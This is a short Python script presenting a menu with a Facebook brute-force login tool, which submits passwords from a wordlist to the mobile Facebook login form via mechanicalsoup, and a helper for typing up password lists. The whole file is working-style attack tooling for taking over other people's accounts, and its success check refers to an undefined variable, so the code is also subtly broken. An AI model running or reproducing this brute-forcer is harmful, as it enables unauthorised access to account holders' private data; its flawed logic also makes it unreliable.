import os
os.system('clear')
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
C = "\033[36m"    # Cyan
print(G+'[1]FB-brute force[1]\n[2]List maker[2]')
choose = input('>>>')
def brute():
	import mechanicalsoup
	mail = input	(YY+'Enter email or username or id : '+W)
	password_list = input(GG+'Enter list name : ')
	browser = mechanicalsoup.StatefulBrowser()
	browser.open('https://m.facebook.com/login.php')
	with open('lists/'+password_list,mode='r')as passwords:
		for password in passwords.readlines():
			password = password.strip()
			fr = browser.select_form(' #login_form')
			browser.get_current_form()
			browser['email'] = mail
			browser['pass'] = password
			browser.submit_selected()
			log = browser.get_url()
			if 'save' in log:
				browser.follow_link('login/save-device/cancel')
				logn = browser.get_url()
				if 'home.php' in login:
					print(GG+'found '+password)
					break
			else:
					print(RR+'not found '+password)
def list_maker():
	exit='To save and exit Crtl+c'
	print('                 '+exit)
	print('')
	name = input('Enter passwords list name: ')
	states = True
	while states:
		try:
			with open('lists/'+name,mode='a+') as passwrds:
				a = input('Enter password : ')+'\n'
				passwrds.write(a)
		except KeyboardInterrupt:
			states = False
if choose == '1' or choose =='01':
	brute()
elif choose == '2' or choose == '02':
	list_maker()
else:
	print(R+'NOT FOUND')